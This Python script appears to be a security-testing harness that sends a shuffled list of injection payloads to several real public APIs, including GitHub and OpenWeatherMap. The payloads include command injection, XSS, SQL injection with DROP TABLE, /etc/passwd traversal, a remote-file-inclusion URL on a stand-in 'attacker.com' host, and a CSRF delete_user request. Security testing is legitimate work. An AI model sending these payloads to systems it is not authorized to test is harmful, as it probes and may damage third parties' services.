import os

import random
from IUNI.IUNI import SecurityTester

# Define the target URLs, headers, and cookies for different APIs
apis = [
    {
        'url': 'https://jsonplaceholder.typicode.com/comments',
        'headers': {'User-Agent': 'Mozilla/5.0'},
        'cookies': {'session_id': '1234567890'}
    },
    {
        'url': 'https://api.github.com',
        'headers': {'User-Agent': 'Mozilla/5.0'},
        'cookies': {}
    },
    {
        'url': 'https://api.openweathermap.org/data/2.5/weather',
        'headers': {'User-Agent': 'Mozilla/5.0'},
        'cookies': {},
        'params': {'q': 'London', 'appid': 'YOUR_APP_ID'}
    },
    {
        'url': 'https://dog.ceo/api/breeds/list/all',
        'headers': {'User-Agent': 'Mozilla/5.0'},
        'cookies': {}
    },
    {
        'url': 'https://api.thecatapi.com/v1/images/search',
        'headers': {'User-Agent': 'Mozilla/5.0'},
        'cookies': {'session_id': '1234567890'}
    }
]

# Iterate over each API and run tests on it
for api in apis:
    # Create a SecurityTester instance for the API
    security_tester = SecurityTester(api['url'], headers=api['headers'], cookies=api['cookies'])

    # Define the test cases for the API
    tests = [
        ('Command injection', '', '; ls'),
        ('XSS vulnerability', '', '<script>alert("XSS")</script>'),
        ('SQL injection', '', "' or 1=1"),
        ('File inclusion', '', '../../../../etc/passwd'),
        ('Insecure direct object reference', '1', '1'),
        ('Command injection via POST', '', '; ls'),
        ('Cross-site scripting', '', '<script>alert("XSS")</script>'),
        ('Local file inclusion', '', f'/etc/passwd'),
        ('Remote file inclusion', '', f'http://attacker.com/malicious.php'),
        ('Server-side request forgery', '', f'http://localhost/admin'),
        ('XML injection', '', f'<test><user>{os.getlogin()}</user></test>'),
        ('Regular expression denial of service', '', f'^(a+)+$'),
        ('HTTP header injection', '', f'User-Agent: Mozilla/5.0\nX-Forwarded-For: 127.0.0.1'),
        ('HTTP response splitting', '',
         f'HTTP/1.1 200 OK\nSet-Cookie: session_id=1234567890\n\n<html><body><h1>Hello, World!</h1></body></html>\n\n'),
        ('Cross-site request forgery', '',
         f'<img src="http://localhost/api/delete_user/1234" onload="var xhr = new XMLHttpRequest(); xhr.open(\'POST\', \'http://localhost/api/delete_user/1234\', true); xhr.send();" />')
    ]

    # Add API-specific test cases
    if 'params' in api:
        params = api['params']
        tests.append(('API parameter injection', '', f"{params['q']}'; DROP TABLE users;--"))

    # Shuffle the test cases
    random.shuffle(tests)

    # Run the tests for the API
    security_tester.run_tests(tests)

    # Print the test results for the API
    security_tester.print_summary()

